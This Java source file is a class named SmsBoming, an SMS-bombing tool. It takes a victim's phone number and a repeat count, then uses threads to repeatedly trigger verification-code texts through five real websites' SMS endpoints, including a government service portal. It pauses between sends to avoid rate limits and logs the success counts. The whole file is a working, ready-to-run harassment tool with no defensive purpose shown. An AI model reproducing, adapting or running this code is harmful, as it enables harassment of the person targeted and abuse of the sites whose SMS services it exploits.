package cn.jaminye;

import com.alibaba.fastjson.JSONObject;
import org.apache.commons.lang3.StringUtils;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;


/**
 * @author Jamin
 * @date 2021/1/21 23:55
 */
public class SmsBoming {
	/**
	 * 手机号
	 */
	public static String phoneNumber;


	public static void main(String phoneNumber, Integer size) {
		SmsBoming.phoneNumber = phoneNumber;
		ExecutorService threadPool = Executors.newCachedThreadPool();
		threadPool.submit(() -> SmsBoming.zstackSendVerCode(size));
		threadPool.submit(() -> SmsBoming.gbhuiSendVerCode(size));
		threadPool.submit(() -> SmsBoming.topcecSendVerCode(size));
		threadPool.submit(() -> SmsBoming.cailiaorenSendVerCode(size));
		threadPool.submit(() -> SmsBoming.sczwfwSendVerCode(size));
		threadPool.shutdown();
	}


	/**
	 * sczwfw
	 *
	 * @param size
	 * @author Jamin
	 * @date 2021/1/22 14:31
	 */
	public static void sczwfwSendVerCode(int size) {
		try {
			SmsBoming.writeLog("sczwfw========发送开始");
			int i = 0;
			for (; i < size; i++) {
				Map<String, Object> params = new HashMap<>(5);
				params.put("url", "https://rzsc.sczwfw.gov.cn/sendUserLogonSms");
				params.put("Content-Type", "application/x-www-form-urlencoded");
				params.put("params", "username=" + phoneNumber);
				String result = HttpUtil.sendRequest(params);
				JSONObject jsonObject = JSONObject.parseObject(result);
				String status = jsonObject.getString("status");
				String message = jsonObject.getString("message");
				if (StringUtils.equals("0x0000", status) && StringUtils.equals(message, "注册手机短信事务成功")) {

				} else {

					break;
				}
				Thread.sleep(70 * 1000);
			}
			SmsBoming.writeLog("sczwfw======== " + "共计成功" + i + "次数");
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		}

	}

	/**
	 * gbhui
	 *
	 * @param size
	 * @author Jamin
	 * @date 2021/1/21 23:55
	 */
	public static void gbhuiSendVerCode(int size) {
		try {
			SmsBoming.writeLog("gbhui========发送开始");
			int i = 0;
			for (; i < size; i++) {
				Map<String, Object> params = new HashMap<>(5);
				params.put("url", "http://wap.gbhui.com/gbesb/services/getLoginCode");
				params.put("Content-Type", "text/plain;charset=UTF-8");
				params.put("params", "app.request.param=%7B%22mobile%22%3A%22" + phoneNumber + "%22%2C%22validation%22%3A%22%22%7D&app.request.param2=null&app.request.param3=null");
				String result = HttpUtil.sendRequest(params);
				JSONObject jsonObject = JSONObject.parseObject(result);
				Boolean success = jsonObject.getObject("success", Boolean.class);
				String status = jsonObject.getJSONObject("data").getString("status");
				if (success && StringUtils.equals("1", status)) {
				} else {
					break;
				}
				Thread.sleep(70 * 1000);
			}
			SmsBoming.writeLog("gbhui======== " + "共计成功" + i + "次数");
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		}
	}


	/**
	 * zstack
	 *
	 * @param size
	 * @author Jamin
	 * @date 2021/1/22 15:08
	 */
	public static void zstackSendVerCode(int size) {
		try {
			SmsBoming.writeLog("zstack========发送开始");
			int i = 0;
			for (; i < size; i++) {
				Map<String, Object> params = new HashMap<>(5);
				params.put("url", "https://www.zstack.io/account/site/send-smscode");
				params.put("Content-Type", "application/x-www-form-urlencoded");
				params.put("params", "to=" + phoneNumber + "&usage=userRegister");
				String result = HttpUtil.sendRequest(params);
				JSONObject jsonObject = JSONObject.parseObject(result);
				String message = jsonObject.getString("message");
				int code = jsonObject.getInteger("result").intValue();
				if (StringUtils.equals("验证码发送成功", message) && code == 200) {
				} else {
					break;
				}
				Thread.sleep(70 * 1000);
			}
			SmsBoming.writeLog("zstack======== " + "共计成功" + i + "次数");
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		}
	}

	/**
	 * cailiaoren
	 *
	 * @param size
	 * @author Jamin
	 * @date 2021/1/22 15:08
	 */
	public static void cailiaorenSendVerCode(int size) {
		try {
			SmsBoming.writeLog("cailiaoren========发送开始");
			int i = 0;
			for (; i < size; i++) {
				Map<String, Object> params = new HashMap<>(5);
				params.put("url", "https://www.cailiaoren.com/user_action.php");
				params.put("Content-Type", "application/x-www-form-urlencoded");
				params.put("params", "mobile=" + phoneNumber + "&act=getcode&ncode=0086");
				String result = HttpUtil.sendRequest(params);
				if (StringUtils.equals("/*ok*/get_ok();", result)) {
				} else {
					break;
				}
				Thread.sleep(70 * 1000);
			}
			SmsBoming.writeLog("cailiaoren======== " + "共计成功" + i + "次数");
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		}
	}

	/**
	 * topcec发送
	 *
	 * @param size
	 * @author Jamin
	 * @date 2021/1/22 14:25
	 */
	public static void topcecSendVerCode(int size) {
		try {
			SmsBoming.writeLog("topcec========发送开始");
			int i = 0;
			for (; i < size; i++) {
				Map<String, Object> params = new HashMap<>(5);
				params.put("url", "http://www.topcec.com/AjaxCom/SendRegSMS");
				params.put("Content-Type", "application/x-www-form-urlencoded");
				params.put("params", "phone=" + phoneNumber);
				String result = HttpUtil.sendRequest(params);
				if (StringUtils.equals("0", result)) {
				} else {
					break;
				}
				Thread.sleep(70 * 1000);
			}
			SmsBoming.writeLog("topcec======== " + "共计成功" + i + "次数");

		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		}

	}

	/**
	 * 写日志
	 *
	 * @param message
	 * @author Jamin
	 * @date 2021/1/22 15:32
	 */
	public static void writeLog(String message) throws IOException {
		File file = new File("a.txt");
		if (!file.exists()) {
			try {
				file.createNewFile();
			} catch (IOException e) {
				e.printStackTrace();
			}
		}
		BufferedWriter bufferedWriter = new BufferedWriter(new FileWriter(file, true));
		bufferedWriter.write(LocalDateTime.now().format(DateTimeFormatter.ofPattern("yyyy-MM-dd HH:mm:ss")) + "\t====================" + message);
		bufferedWriter.newLine();
		bufferedWriter.flush();
		bufferedWriter.close();
	}

	static class HttpUtil {
		/**
		 * 请求公共类
		 *
		 * @param map
		 * @return {@link String}
		 * @author Jamin
		 * @date 2021/1/21 23:23
		 */
		public static String sendRequest(Map<String, Object> map) throws IOException {
			URL url = new URL(map.get("url").toString());
			HttpURLConnection connection = (HttpURLConnection) url.openConnection();
			connection.setRequestMethod("POST");
			connection.setRequestProperty("accept", "*/*");
			connection.setRequestProperty("connection", "Keep-Alive");
			connection.setRequestProperty("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)");
			connection.setRequestProperty("Content-Type", map.get("Content-Type").toString());
			connection.setConnectTimeout(5000);
			connection.setReadTimeout(5000);
			connection.setDoOutput(true);
			connection.setDoInput(true);
			//设置参数
			OutputStream outputStream = connection.getOutputStream();
			String params = map.get("params").toString();
			outputStream.write(params.getBytes());
			outputStream.flush();
			outputStream.close();
			InputStream is = connection.getInputStream();
			BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(is));
			StringBuilder result = new StringBuilder();
			String str = "";
			while ((str = bufferedReader.readLine()) != null) {
				result.append(str);
			}
			is.close();
			bufferedReader.close();
			return result.toString();
		}
	}
}
